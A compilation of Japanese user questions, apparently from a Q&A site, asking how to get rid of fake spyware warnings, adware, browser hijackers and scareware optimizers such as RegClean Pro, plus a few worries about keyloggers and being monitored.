どなたか分かる方よろしくお願いします。 パソコンがウィルスにかかったようです。 内容は、インターネットを見ていると画面右側または、下にスパイウェアを検出しましたと表示されます。 とても無知なもので、どうして良いかわからず。 どなたか分かる方、無知な私にわかりやすく教えて頂けませんでしょうか？ よろしくお願いします。
ガ出るようになりました。これは何でしょうか？ うざいので削除したいです。 どうしたらよいでしょうか？
Macを立ち上げると「SafariはWebサイト”www.facebook.com"の識別情報を検証できません。このWebサイトの証明書は不明な認証機関によって署名されています。表示されます。”www.facebook.com" に偽装したWebサイトに接続している可能性があり、機密情報が漏えいするおそれがあります。それでもこのWebサイトに接続しますか？」との表示が現れます。もしかしてこれは、「フィッシング」でしょうか？もし、そうであれば対応はいかがすれば良いですか？当方、ネット関係にはうといので、どなたか分かりやすく解説していただければと思います。よろしくお願いします。※この表示が出るようになって画像がアップ出来なくなりました。
詐欺まがいの広告が出てきてしまいます。 内容は、「パソコンの性能が低下しています・・・」パソコン本体ではなく 特定のサイト、しかも私のブログをクリックした際にのみ 表示されてしまいます。各種質問サイトなどみて試しましたが、 やはり消えません。他のPCから、やはりこのサイトをクリックすると 同様の詐欺まが広告が出てしまいます。 ブログ訪問の方にも、これではご迷惑がかかり、なんとか対処策 教えてください。　もうブログ引越しするしかないのでしょうか　? 広告サイトなど、広告付きタグなど原因なのでしょうか。
デスクトップ画面に英語で「This evaluation version　of PC Tools Registry Mechanic only fixes some　PC performance issues.～～～～subscride to the full version.」とメッセージがでて消去ボタンXをクリックしても無反応です。メッセージの横に「Subscride Now」と表示がありそれをクリックすると「PC　tools」の購入画面が出ます。シマンテックのメッセージですが、なぜシマンテックともあろうところがこのような海賊版的なことをするのでしょうか。どうしたらこのメッセージが消えるのでしょうか。 ちなみにウイルス対策は今年のNortonを入れてます。
「スパイウェアが検出されました」で有名な詐欺ソフト「RegClean Pro」をアンインストールしたのですがまた復活されてしまいました。 「Yontoo」なども削除すれば消えるということですが、インストール項目にはありません。 「最近インストールしたソフト」で並べ替えても他に該当するソフトはありませんし、セキュリティソフトでは検索されないようですが、本当でした。 私の使用ブラウザは「Firefox」ですが、「アドオンマネージャ」をみたところ、 「Java Deployment Toolkit は安全ではありません。注意が必要です」という項目もありますが、これは昔インストールしたようで、この広告がでる以前のものです。（一応無効化しましたが） 見つけ方が分かりません。本当にうざいです。このような状態でアンインストールする方法はありますか？
XPです。 「お使いのコニュータでスパイウエアが発見されました」のようなポップアップ画面が突然表示されて、「無料ですぐ直す」というボタンが、最近たまに現われます。 今のところは無視してその画面を閉じていますが、本当に直してくれるのなら直したいと思います。 このボタンをクリックしても大丈夫でしょうか？ ただ、どこが発している情報なのか、ということは一切書かれていないので（たとえ書かれていてもですが）若干不安があります。 （買い換える、以外で）適切な対処法を教えてください。 　　
気になったので バカな質問してみます。 あるサイトにて（海外と思われる） URLのブロックリストを見つけました。 それで 記事内の 全ての文字を コピーし 新規作成のテキストへ 貼り付けしました。 そしたら セキュリティでひっかかりブロックされました。 （内容はイマイチ覚えてないですが） サイトから文字をコピーして 感染って ありえると思いますか？ たとえば あるコードを文字のように見せかける 等。 出来るのかどうか 気になりました。 バカな質問だとは 思うけど 釣りではないのでｗ 単純に ありえるか？ 判断だけ 意見を求めます。
PC起動時に次のようなメッセージが出てきます。 「お使いのパソコンがクラッシュ寸前です」「コンピューターに感染ファイルが見つかりました」 「Reminder Your Computer Is Not Backed Up, Backup Your Files Online Today 」 「お使いのパソコンの性能が低下しています」 どうすれば出なくなるでしょうか。 最近、重くなってきたのでAdvanced System Protectorという ソフトを入れました。 .
私のパソコンで私は、ネットからたくさんのフリーソフトをダウンロードしてるのですが、買った時には、ブラウザにうっとうしくて余計な広告表示がなかったのですが、半年前ぐらいから、ブラウザに、『あなたのパソコンがウイルス感染してます、今すぐ無料ソフトでスキャンや、たくさんのレジストリエラーが発見されました、無料ソフトで安全修復』などのうっとうしくて余計な広告表示が表示されるんですが、これって、スパイウェアに感染してるんですか？ ちなみにこの表示は、リンク先でも常に表示されます『×ボタンを押せば消えます』。 でも、セキュリティ対策ソフトで何回もフルスキャンしましたが、『スパイウェアは感染してません』となります。 どうすれば、この広告表示を完全に消せますか？ 教えて下さい。お願いします。
Webブラウザの設定で、Cookieの保存期間を「ブラウザを終了するまで」としています。 しかし、Webブラウザ終了後に、ウィルススキャンを実行するとTracking　Cookieを検出した と通知されることがあります。 ブラウザを起動し直した後、オプションから「Cookieを表示」すると 何も表示されないため、Cookieは全て消えている認識なんですが。。。 ブラウザを終了しても消えていないCookieがあるのでしょうか？ 気持ちが悪いので、どなたかご教示ください。 ＃ブラウザはFireFoxで、OSはWindows7です よろしくお願い致します。
ホームページを開くとWindows のエラーを検出してください とうっとおしいCMタグが出ます これを解消するにはどうすればよろしいでしょうか？ ちなみにノートンのN360では異常なしでした
RegClean Proなる詐欺まがいと噂されるソフトが勝手に侵入し、「スパイウェアが侵入した」「危険なのでわが社のソフトを買え」云々の広告をしつこく表示させます。お前がスパイウェアだって！ これを表示させない様に削除したいのですが、Program Filesにも、コントロールパネルの「プログラムと機能」にもそれらしきものが見つかりません。どうすれば駆除できるでしょう 下記のようなサイトも見たのですが、そもそもインストールしてませんし、見当たらないのですが。。。 http://www.geocities.co.jp/Playtown-Yoyo/6130/no …
初めて質問します。 起動画面に金銭請求と思われるメッセージが表示されましたが ポインターとキーの操作出来ない為削除出来ない状態のままです 処置方法を御存知の方教えて下さい、よろしくお願いします。
Ad-Awareというスパイウェアを５、６年前から使用してます。 無料で使用できるフリー版です。 そもそもこういうスパイウェアって外国製で英語も意味がわからず、なんとなくスキャンしてみてそれらしきものが見つかると検知し、削除してくれるっていうだけで、あまりよく理解していません。 Ad-Awareは、Ver.１０になってからデザインも大きく変わりました。 すると、よくわからなのですが、スキャンをしても何も検知しなくなりました。 フルスキャンではなく、重要なところだけをスキャンするというスマートスキャンというやつです。 しかも１分くらいで終了してしまいます。（前までのバージョンでは、スマートスキャンでも５分くらいかかり、毎日のようにスパイウェアを複数個検知していました。） これって、効果があるのかないのか、使い方がこれでいいのかよくわかりません。。。
こんばんわ 先日、ＧＯＭプレイヤーで動画を再生できなかったときに、 「コーデックパック」というのをダウンロード→インストールしました。 それからというもの、新しく別でタブを開いたり、 更新したりすると添付している画像が出てきて困っています。 (他にも違うタイプの画像も出てきます) 何か一緒にインストールしたみたいで、 どうしたらこのウィンドウを非表示できるんでしょうか？ 何とかアドバイス頂けませんでしょうか？ どうぞ宜しくお願いします。
素人の質問で恐縮です。 拡張子rarのファイルを解凍したかったので、ネット検索し、質問箱の回答にＬｈａｚがおすすめとあったので、すぐ下の行にあったＵＲＬからダウンロードしました。 インストールしようとしたら、セキュリティソフトから警告文が表示（スパイウェアが検出されました、隔離できません）されたので、インストール95％終了の時点でキャンセルしました。 そのあとエクスプローラをクリックすると、スタートページが見たことのないサイトになっていて警告文が表示されました。ＰＣの処理速度がどんどん遅くなっています、クラッシュ寸前すぐに修理、など複数の警告が次々に表示されました。他のサイトを表示してみると、ＭＳＮ、グーグル、ＯＣＮ、ヤフーのトップページでは同じ警告が出ましたが、ニフティとgooのトップページでは表示しませんでした。 あちこちのサイトを見ているうちに、インストールした記憶のない、システムの状態をチェックするソフトが起動し、エラーチェックを始め、エラー数がまたたく間に増え、レジストリの損傷レベル大という結果を出していました。 ウィンドウを閉じて、コントロールパネルからプログラムの一覧を見ると、新たにツールバー等5つのプログラムがインストールされていました。何故かゲームソフトも入っていました。それらを全部アンインストールすると、警告は出なくなりました。 気になってデフラグしてみたら断片化25％という結果でしたが、パソコンを使っていて動作が遅くなった感じはしません。このパソコンをそのまま使い続けていて大丈夫でしょうか。
最近買ったデスクトップPCで、osはwindows8,ウィルスバスター搭載です。 最近自分のＰＣの内部（office file、お気に入り、アドレス帳等）を他人に覗かれる心配をしています。 以下のケースで具体的に危険度を教えてください。 １　　ｐｃの電源がoffのとき。 ２　　ｐｃがスリープ状態のとき。 3　　pcを使用中のとき（自分が操作しているとき）。 ４　　電源onで、pcを使用してなくて尚且つｐｃがスリープ状況でないとき。
エディターソフトなどで執筆しているとtrashフォルダにスペアファイルが自動保存、更新されていきます autosaveフォルダはさらに断片的な作業の合間に切り取りしたようなものが自動保存されていきます 2つのフォルダは私が造った訳ではなく勝手に出来ています なんのためにあるのか 作られないように出来ないのかをお教えください 本来不可視フォルダなのか？ 私が誤って削除したときようにおせっかいで保存しているのか？ まさかウイルスなのか？
最近になって、IEを起動すると「スパイウェアが検出されました」と点滅し、その右に「システム内でスパイウェアが検出されました」と出て、「今すぐ直す」のボタンが頻繁に表示されます。 ウィイリスセキュリティで確認しますが感染した様子はありませんが・・・・ 対策法があれば教えてください。 マルウェアの削除も試みましたが。
SUPERAntiSpywareの定義ファイルのアップデートが出来ません！サービス停止になってるかも知れませんが、そのサービス名が判りません！教えて下さい！ イントールはProgram Files（X86）のフォルダーにカスタムインストールしたんですが！ファイルの中に「64」が含まれるファイルが有ったりしますので！Express Install した方が良かったのかなと思いました！何故かと言うとExpress Install すると、Program Files へインストールされてたからなんです！現状では定義ファイルのアップデートが進まず、X点で閉じようとしたら応答なしになってしまいます！困ったものです
お世話になっています。 前回も同様の質問でアドバイスいただいたのですが、解決できなかったのですみませんが再度質問させてください。 FAX送信表のテンプレートを海外のフリーソフトからダウンロードしてから、 決まってお昼ころに、突然こういった広告がデスクトップ画面に開くようになってしまいました。 「ウインドウズエラー：　あなたのパソコンはクラッシュ寸前です　　このソフトをダウンロードしてください」 アドレスをみると、http://web.tofushopnews.com/g/?ilmernzkvtazn=002 … 「トーフショップニュース」という、あからさまに海外の人が日本人のふりして作った的なURLです・・・ これに感染？してから、作業中もフリーズしたり、ウィーーーンというすごい音（その間のPC使用率１００％）がでて、まともに作業できず困っています。 「アドオンの拡張機能」や、 Ctrl＋+Alt+Deleteで「実行中のアプリケーション」や、 「プログラムの追加と削除」などをいろいろみましたが、ソフトの知識もなく、怪しいものは全く見つけることができませんでした。 隠しソフト？みたいに、非表示なものを表示させる方法もわかりません。 何とか解決する方法はありますでしょうか・・・。 訳あってリカバリという方法以外のやり方で解決したいと思っております。 ウィンドウズビスタで、SP3です。メーカーはNECのMATEです。
というスパムメールの urlをクリックしてしまいました 今からなにか 対処法はありますか。
パソコンが盗撮されている感じです・・・。 （買ってから、3年間インターネットに繋げていました。ここ数年は繋げていません。 パソコンで、スノーマンを描いたら、 その一日後、 知り合いに、「今のあんたはスノーマンみたい」と言われました。 そして、 自分が家の中でしゃべった内容も他人に知られているような感じです。 どう対策したらいいのか判りません。最適の方法があれば、教えてください。
パソコンが盗撮されている感じです。 （買ってから、3年間インターネットに繋げていました。ここ数年は繋げていません。 自分がパソコンで作った作品の象徴が、（例えば、電車に乗った、桃のダンサー描いたら） 描いて、1日～数日後、 近所の生活圏で、（スーパー、本屋、レンタルショップ、リサイクルショップ、百貨店、モール） 桃と電車の組み合わせの絵が描かれた商品が売られていたり、桃に電車の置物を置いたり、 （無かった場所に） そういう事がたて続けに起こります。 自分が家の中でしゃべった内容も知られているような感じです。 どう対策したらいいのか判りません。最適の方法があれば、教えてください。
以前から現れてはいたのかもしれませんが、目立たない程の大きさだったので気になりませんでしたが、ここ数日は以前より大きな広告が頻出するようになりました。 その大方は「PCが危険にさらされてます」「ウイルスが発見されました」という文言の広告です。 その内の一つのURL ad.yieldmanager.com が原因なのでしょう、私も複数の対策をとってきたので、頻度は減ってはきましたが、まだこの広告だけは暫くすると現れるので、まだ根絶には至っていません。 それ以外にも、明確に覚えてなく恐縮ですが、skyweak　などと言う名の何かも広告を呼び込んでいるようです。 どなたか、PCやITに明るくない私にも分かるように対処法を教えては頂けませんか？ よろしくお願いします。
win764bitでspybot1.6.2のスキャン開始、スキャン後spybotが応答なしとなりフリーズしてしまいます。フリーズ中タクスマネージャーのアプリケーションからタクスの終了でspybotを強制終了。何度やっても同じ症状です。免疫、アップデートは可　リカバリー出来ず困っています。良い解決策があれば教えてください。宜しくお願い致します。
私は削除する方法がわからない http://manual-removal.com/remove-internet-securi … 役立っていない
無知な私にご享受ください。 例えばtwitterなど、ログインしようとして、IDとパスワードを入れた後、スパム確認のため、 Re CAPTHAがある場合、いつも、そこに見える単語や数字を入れるのですが、そこから先 必ず失敗し、別な単語で再度入力を求められてしまいます。 筆記体のような斜体のアルファベットをどのように入力すればよいのですか？ 自然に目に見えてとれる文字を入力しても、絶対はねられるので、何か自分のやり方が 間違っているのだと思います。 アルファベットと写真の数字のようなものがある場合もありますが、 Re　CAPTHAのヘルプを読むと、複数の単語がある場合は、スペースで区切って入力するように ありますが、そのようにしても、ログインできません。 教えてください。
SOFTBANKのガラケーを使用しています。 理由は省きますが、アクセスサイトはもちろん、メールなど文字を打ち込んだ情報が間違いなく漏れていますし、文章を打ち直していることも漏れています 確認、対策、削除方法など何でも結構なので教えて欲しいです。 恨みをかった覚えがあります。どうかお願いしますm(__)m
playストアーから、Adobe Illustrator Tutorials（Adobe系のアプリばかり作ってる作者の方）というアプリをインストールしたら『正常にイ ンストールしました』というメッセージが出た直後にAVGというウイルス対策アプリが『malwareを検出しました。アンストールしてください 』と出たのでアンストールしました。そのmalwareとはインストールしただけで、そのアプリを実行してない段階でも既に感染してしまう のですか？又、ドラックとドロップでアプリ情報を覗いたのですがアプリを開いてしまった事になりますか？ 問題のアプリを実行はしてないものの、オンラインゲームをやってたら『複数のデバイスで遊ばないでください』というメッセージが出たので、遠隔操作されてるのではないかと思ってしまいました。しかも突如現れた対戦対手が私のGoogleアカウントに含むワードと一部同じだったので不審に思いました。あともう一つ気になったのですが、ストレージの空きが少なくなってました。何かファイル送り込まれたりしてないか疑ってます。マルウェアによってなにかしら攻撃を受けてる可能性はありますか？ 遠隔操作されてないかなど調べる方法はありますか？ OSはAndroidです。知識がないため困っています。宜しくお願いいたします。
youtubeを見ていてもgoogleをみていても再度に 『スパイウェアが検出されましたチカチカチカチカチカ！！！！』 目が痛い！！！！！！ちかちかちかうざい！！！！！ しかも勝手にポップが出てきて 『スパイウェアが検出されました！！』 マカフィーのプロテクションスウィート（セットのようなもので月額500円くらいする）をやっているのにも関わらず感染してしまったのでしょうか。 マカフィーはだめなんでしょうか？ だいたいスパイウェアが検出されましたっておまえ（ソフト）がスパイウェアだろっていいたいのですが・・・。 あぁあぁぁぁあ目が痛いです！！ 他ヘルプ見ましたが、ただの宣伝広告ではないようです。 勝手にポップアップがぼんぼんでてきてチカチカチカチカチカチカ なんなんすかこれ！！！
こんにちは。 最近私のＰＣが凄いことになってきているので、不安になり、なのでここで質問させていただきます。 ここ数カ月、勝手に窓が開いて外国のサイトに繋がってみたり、窓を開くと勝手に外国のサイトに繋がったり、動画が再生されたりしました。 最近に、設定をいじっていないのに勝手にスリープするようになりました。（これはもしかしたら私が何かしたのかもしれませんが、設定自体が変わっていたので一応…。） 前までは結構オンラインゲームをしていて、重くなるのでウイルスソフトなどは入れていませんでした。 というか、それでもしばらく何もなかった方が不思議で、油断していました…。 私はスパイウェアか、アドウェアだろうと思い、とりあえずウイルスバスタークラウドのお試し版でサーチしてみました。昨日にとり入れたばかりなのに、もうスパイウェア検出３、web脅威８という驚きの数字が出てきました。 私、ＰＣを触り始めて長いのですが、知識としては初心者といってもいいほどです。 だったら大人しくウイルスソフトを外したりするなっていう話ですけど、学生だったのでお金もなく・・・。 web脅威と検出されたURLを見ると見覚えのあるURLでした。（外国サイトを開くやつ） サイトを見ているとどんどん加算されていきます。きりがありません。 こうゆう場合はどうすればよろしいですか？ リカバリを考えたりもしています。社会人になった今、クレジット番号などもwebで扱うこともあると思います。怖いので、今のままのこのＰＣじゃ危険かなと感じました。 ちなみに、今回検出したスパイウェアはADW_SPROTECTという名称で、検索すると、情報を抜かれるとかいう危険性は少ないとのことでした。削除済みです。 今回はそれで胸をなでおろしましたが次は分かりません。 申し訳ないですが、教えていただいてもよろしいですか？
昨日、なんか変なの出た。 スパイウェアが入って重くなってるって、 でもこれクリックしても、危なくないのかな？ とか言われて、良く分からず 画面を閉じてしまったんですが 今朝、立ち上げたら 物凄く遅くなりました。 何か、インストールしてしまったようです。 パソコン内のウィルス検索とかは問題無し と表示されますが、怖いので原因を取り除きたいです。 どこから探せば原因を突き止めて、対処出来るでしょうか？ ウィンドウズをＸＰで使っています。 プログラムにアクセスしたことはほとんどないので 分かりやすく教えてください。 よろしくお願いします。
表題の関係の質問が多々されていますが、当方も同じくです。 ＰＣが遅いとかクラッシュ寸前とかスパイウェアに感染してるとかの広告がありクリックしてしまいました。 表示される手順どおりに進めていくと料金請求になったのでこれはダメだと思いそこで止め、今までにインストールしてしまったものをアンインストールしました。 たぶんアンインストールは成功したと思うのですが、念のため「スパイボット」でスキャンしました。 そうしたところ何点か見つかり削除しました。 しかし次の２点がどうしてもスパイボットで削除できません。 仕方の解るかたいらっしゃったら教えてください。 (1)ＩｒｏｎＩｎｓｔａｌｌ．Ｔｏｏｌｂａｒ．Ａｍａｚｏｎ　 　　（ｓｐｙｗａｒｅ　Ｃ） (2)USTｅｃｈＳｕｐｐｏｒｔ．ＭｙＣｌｅａｎＰＣ 　　（ＰＵＰＳＣ）
先日、Ｒｅｇ Ｃｌｅａｎ Ｐｒｏを間違ってインストールしてしまいました。 間違えた事に気づいてすぐアンインストールしました。 すると、例の「お別れするのは残念です」画面でしたが、 もちろん無視してアンインストール完了までしました。 が、しかし、マイクロソフトっぽいポップアップやら、 不安を煽るポップアップ、または広告サイトが勝手に開いたりします。 全てはＲｅｇ Ｃｌｅａｎ Ｐｒｏが完全に削除されていないためと思います。 しかし、全てのプログラムにもコンパネ→プログラムの追加と削除にも Ｒｅｇ Ｃｌｅａｎ Ｐｒｏはもちろん、みなさんが削除しましょうというYontooもありません。 あのじゃまくさいポップアップから、さよならするにはどうしたらいいでしょうか？ OSの再インストールしかないのでしょうか？ 勝手ながら初心者ですので、レジストリなどを触るのは少々抵抗があります。 ちなみにワンクリックウェア駆除ツールやAd-Awareのスキャンぐらいは 試してみましたが、ダメでした。
マイクロソフトからRegCleaｎProを勧められましたが ほかに無料でよいソフトはありますか？ 現在はキングソフトを使用しています
サイトのID PASS 後なにより、クレジット番号流出防衛のためにキーローガー等対策ソフトはありませんか。ソフトウェアキーボードで対策しようと思いましたが、フリーソフトばかりで信用なりません。しかも普通のソフトウェアキーボードではキーローガの画面キャプチャー型には意味ないようです。http://internet.watch.impress.co.jp/cda/event/20 …画面を収集するため、ソフトウェアキーボードで入力してえる画面が丸見えとの事、フリーソフトでソフトウェアキーボードで画面キャプチャ対応済みがありましたがそれもフリーソフトです。http://all-freesoft.net/soft/antispyware/oxynger … 市販でキャプチャー型キーロロガー対策ソフトウェアキーボードのソフトは販売されていませんか？わがままかもしれませんが、日本の企業が出されてる物希望です。アドバイスもほしいです。仮に日本企業でも得体のしれない小さな会社を使うより、市販のセキュリティソフトでフルスキャン後、普通に入力した方がまだましとか、セキュリティに詳しい方なら色々おしえてください。現在ウィルスバスタークラウドを使用していた時、FACEBOOKで友人に無作為にメールを送りつけるウィルスにかかってしまい、セキュリティソフトでは駆除できず、MICROSOFTのフリーのスキャンで駆除できました。自分が悪い所もあります。メールが来て写真形式のファイルだと安心して空けた自分も悪いと思っています。現在カスペルスキーを体験版で使っていますが、不具合が多くて使えません。お願いします。環境です。IE9 windows7 homepuremium 64bit CPU core i 7-2600 メモリ16GB マザー不明（マウスコンピューター） グラフィックボード GTX560i HDD 2TB 7200rpm 64MBです。環境補足したので新しく質問しましたので、似た質問がこれ以外に1つあります。回答する方、OKWAVE運営さんにご迷惑かけます。質問は消せないとネットで書かれていました。
OK WEBのトップページの今日のOKボタン(赤い)のすぐ下に bingと書かれた検索エンジンがあるのに気付きました。 これは前からこのHPにあるものでなのですか? スパイウェアに感染の可能性はありますか? ウィルスバスターでスキャンしても検知はされませんでした。
OSはWindows7HOME ブラウザはIF10です ツールバーと拡張機能に ワンノートに送る　ワンノートにリンク があるのですがこれはスパイウェアなのですか?
今日PCを立ち上げ、IEを立ち上げたところ 有料アダルトサイト「○○○○」のご利用ありがとうございます。 下記の内容をご確認の上、お手続きを完了して下さい・・・・ 添付の画面が出てきて何度消しても消えません。 消すには料金のお支払いが完了しないといけないというようなこと が、書かれています。 この画像を消したいのですがどうすればよいのか教えていただきたいと思います。 よろしくお願いいたします。 特にアダルトサイトを見た記憶もありません。 大変困っています。よろしくお願いいたします。
　リモートコントロールソフトを 使用した場合、 　リモートコントロールされる側は している先を認識することはできますか？ 　ソフトの設定・機能でできない場合、 それを探すことはできますか？
Linkury社のQuickShareというプログラムが知らない間にインストールされていることがわかり、これをコントロールパネル→プログラムと機能　によって、アンインストールとしても、いつまでたってもアンインストールが完了しません。C:￥programfile　においてもQuickShareという名のプログラムはありません。QuickShareとは何者かも判らず、困っています。
今、パソコンにノートンインターネットセキュリティ２０１２を入れています。 また、Ad-Awareのバージョン９．６．０が入っています。 Ad-Awareは、アップデートで１０になるようなのですが、 これをアップデートして、ノートン製品と干渉しないでしょうか？ もし干渉するようでも、設定によって変えられるのでしょうか？ ○追加質問 パソコンの追加購入と同時に、新たにセキュリティソフトも購入予定です。 ノートン３６０とAd-Aware１０の場合でも干渉はありますでしょうか？ アドバイスいただけますか。よろしくお願いします。
こんばんは　 パソコンに　下記のような表示がしょっちゅう表示されるようになって困っています ＞スパイウェアが検出されました。システム内でスパイウェアが 検出されました　マルウェアの影響でコンピューターが 通常より遅くなっています。 　　　　　　　今すぐ直す また ＞お使いのPCの動作が遅いです ここをクリックしてエラーを修正 また ＞Registry ScannerでWindowsを高速化 今すぐスキャンを開始 　　Systweak たった３つのステップでPCを掃除　最適化します いずれも　無料をうたっています など　内容は諸々ですが　大体は パソコンが危機にさらされているので　ここをクリック…… といったような内容です。ネットを立ち上げる度にでてきて　ひじょうに 煩わしいです これには　どう対処して良いものか分からず 困っています パソコンの動作は非常に遅くなっているのは事実です パソコンの　動作をもう少し　さくさく動くようにしたいのも 事実で、今不要なプログラム（ソフト）をアンインストールしたりなど改善を試みています ただソフトによって　アンインストールができないものなどがあって　なかなか改善に いたりません （MIX PADという　ソフトがアンインストールできないなど……） 質問したいのは、これら（無料でPCを修正として表示されるもの）を　クリックして良いものなのでしょうか？ ということです。無料で……というところも　怖いし　さらにパソコンの状況が悪くなるのも 避けたいです また　クリックをしない方が　よいということであれば これらが　表示されないようにするには　どうしたらよいのかということです どなたか　お知恵をお貸しいただけないでしょうか？ 機種は東芝のAX/55A　OSはVISTAです ３か月間にウィルスバスターの期限が切れて以来 特別な　ウィルス対策はしていません もし　同じよう状況の方がいらっしゃって　そもそもの原因や 対処方法などがあるのでしたら 教えていただけないでしょうか？ なぜ　このような状況になったのかわからず 状況説明が不十分ですが　分かる範囲で良いので 少しでも　打開策をお教えください　 もう少し　詳しい状況説明が必要でしょうか？ 分かる範囲のことは　できるだけ　書いたのですが…… 宜しくお願い致します
私は自分で作ったWebサイトにワードプレスで作ったブログをリンクしているのですが、そのブログにやたらと英語でのコメントが付きます。 海外からのアクセスだと思うのですが、一体、これはなぜなのでしょうか？ これって、ようは自分のメールアドレスにくる出会い系のスパムメールみたいなものなのでしょうか？
　先日あるソフトをダウンロードしたところUNIBLUEが一緒に入り込み警告が始まりました。ネットで調べて いろいろ試みました（プログラムのアンインストールなど）が、削除出来ずほとほと困っております。 　どうか完全で解りやすい削除方法をご教授下さい。よろしくお願いいたします。
システムケアアンチウィルスを削除しようと調べる前にショートカットを削除してしまいました 今後どうやったらシステムケアアンチウィルスソフトのフォルダの場合を調べ削除出来ますか？
セキュリティケアアンチウィルスを削除しようと安易にデスクトップにあるマークを削除してしまいました ですが後で削除方法をスマホで検索したところ、それからウィルスのある場所がわかるとか？ デスクトップにあるマークを削除した今、どうやって完全削除すれば良いのでしょうか？
リンクすると、「スパイウェアが検出されました。」と表示されて、とてもうっとうしい。 わずらわしいので、右上の閉じるボタンで一度閉じてから、再度、リンクすると希望のHPが開きますが、毎回ではないけども、本当にわずらわしいので、表示させない方法をどなたか御存知ですか？
Softonic Japan Toolbar（ソフトニック ジャパン ツールバー）について ソフトニック ジャパン ツールバーって危険なのでしょうか？ windows7 の 「プログラムと機能」 からアンインストール（消去）できません。 アンインストールしようとすると、　「could not open install log file」　と小さなウィンドウが出てきてアンインストールができません。 翻訳すると、「could not open install log file」＝「ログファイルをインストールし開くことができませんでした」 もしかしたら、Softonic Japan Toolbar（ソフトニック ジャパン ツールバー）は、トラッキングクッキー、トロイの木馬、ハイジャッカー、ダイアラー、バックドア、偽アンチスパイウェア 等々なのでしょうか？ とても意味がわかりませんし、アンインストールできませんので解決策を教えてください。
最近インターネットエクスプローラを起動すると「about:blank」と題する画面が立ちあがり、設定したホームページが開きません。「お気に入り」から目的のサイトを呼び出そうとすると繋がるのに途方もなく長時間を要します。 「システムの復元」で過去の一定時点(私の場合は5月5日)に戻すと、一時的に問題が解消され、PCが立ち上がっている間はインターネットはいつも通り自由に目的のサイトにスムーズに繋がるのですが、一旦PCをシャットダウンして再起動すると最初に述べた不具合の状態が再現します。この状態のときウイルスバスターで検索をかけてみると、「駆除されたブラウザCookie」の中に「revsci.net」というのが必ず入っています。何度システムの復元をやってみても毎回同じ結果です。「システムの復元」ではレジストリの回復も実施しているように表示されていますので、次回立ち上げ時に同じ不具合が再発するのはこの「revsci.net」というCookie?が悪さをしているのではないかと想像していますが、どなたかPCとインターネット接続に詳しい方、原因と対処法についてご助言・ご指導賜れば、大変ありがたく思います。
ホーム画面以外でブラウザを移動した時の画面で右側と下に　宣伝の画面が出てきてしまいます 回復をやったのですが　ダメでした　どうしたら画面から消せる事が出来るでしょうか? マウスで消しても　またブラウザを移動すると出てきてしまうので　鬱陶しく思います
御世話になっております。 先程、SpyBotでスキャン中、画像通りの前例の無い不可解なメッセージとダイアログが表示され、ただでさえ先月から一箇所だけ処理できず、最起動時に再試行しても解決しないという症状が続いており、警戒していた矢先な為、これだけではセキュリティの「改善」か「改悪」か判断に困っており、 ダイアログを保留にしております。 対処法を御教示頂ければ幸いです。宜しくお願い致します。
近頃、インターネットを閲覧中、通常のページ内リンクをクリックすると、 タイトル　Ads By infinityads.com 内容　　 Babylon翻訳ソフト　まもなくダウンロードが始まります・・ というポップアップが勝手に表示されます。 アドウェアでしょうか？ ウイルスバスタークラウドでは検出されません。 Googleで検索しても日本語のページではヒットせず、英語のページでは削除ツールらしきもののダウンロードはありますが、それ自体がウイルスではないかと心配で手を出せません。 削除する方法を教えてください。 ブラウザはChromeです。
頭題の件なのですが、ネット検索などしている際、フォックスの場合も、エクスプローラーの場合も、いきなりウインドが現れ、アップデートだの、グリーンカード取得おめでとうだの、コンピューターが危険にさらされていますだの、非常に不愉快なアドが現れます。ある日突然のことなので、なぜ、このようなことが起こったのか不明です。これらの現象を阻止できる対策などございまいたら、ご教示いただきたく、できますれば、ど素人のわたくしに、理解しやくご説明いただければ幸いです。どうぞ、よろしくお願い申し上げます。（お手間をおかけしまして、申し訳ございません。お時間がおありのときに、宜しくお願い申し上げます）
一度ハッキングされてしまうと、ネットにつながない状態で使用しても情報を取られ続けてしまう、といったことはあり得るのでしょうか？ １、ネット経由のハッカーの場合はあり得るのか？ ２、身内などがハッカーの場合パソコンを一度触らせてしまうと、 パソコンを触れない状態、ネットにつながない状態にしても情報を盗むことはできるのか？
身内にハッキングしているものがいる場合 プロバイダーのＩＤ等を教えない。 ルーターのパスワード等を教えない 絶対にパソコンを触らせない この状態でもハッキング（パソコンを覗かれること）されることってあるのでしょうか？ どのような手段で行うのでしょうか？
ウイルス対策は、３年近くwebrootを使っていたのですが、 １０日ほど前からパソコンを立ち上げる度に、 「プログラムは更新を確認できませんでした」と出てくるので、 問い合わせの電話番号に何度も電話しましたが、音楽が鳴りっぱなしで繋がらないため不安になったので、webrootをアンインストールし、 最近Jcomと契約をしたので、zaqのホームページから、 「マカフィー」をダウンロードし、「メールウイルススキャンサービス」を設定しました。 「ホームページウイルススキャンサービス」も設定したほうが良いのか迷っています。 【質問】 「ホームページウイルススキャンサービス」も設定すると、重たくなり画面表示が非常に遅くなるのものでしょうか？ 「マカフィ」を使っているのなら、特に必要なにものでしょうか？ どうぞよろしくお願い致します。
会社から配布されたモバイルPCがあります。 社内のLANに接続しているときはすべてを監視されていると承知しているつもりです。 PC保守の会社がPCに遠隔で入る事ができる事も承知しています。 しかし社外に出て、個人契約のポケットWIFIで接続している時は 閲覧しているWEBページ等の情報を会社が監視することは可能なのでしょうか？ ローカルPCのどこかにログが蓄積されて 社内LANにつないだ瞬間に流れる仕組み等あるのでしょうか？ それらしいソフトは PacketiX VPN　というソフトが常駐しているようです。 先日いろいろと設定を行うときに設定できず PCの設定を行う時は必ず社内LANに繋ぐように言われました。 ですので、社内LANに繋がなければ監視できないのではないかと感じています。 御教示よろしくお願いいたします。
ＰＣを多用するハードゲーマです。 取引用にノートＰＣと、ゲームや遊び用にデスクトップを別途購入を考えたのですが もしかしてＰＣでログインする際のユーザーを二つに分けるだけで 別途購入する必要ないんじゃないかと思うのですが・・。 あるいは、ＭＡＣのブートキャンプの様に ＭＡＣ側で銀行口座、株の売買 ＷＩＮ側でゲームといったような。。？ どうでしょうか？
ブラウザのホームページが強制的にttp://searchiu.com/?affil=141というサイトにアクセスしてしまい困っています。 ブラウザのオプションからホームページのURLを変更してみましたが、searchiu.comが表示されます。 Nortonで完全スキャンなどしましたが何もひっかからず、グーグルでsearchiu.comについて検索してみましたが、海外のページばかりでよくわかりませんでした。 どなたか削除の仕方を教えてください。
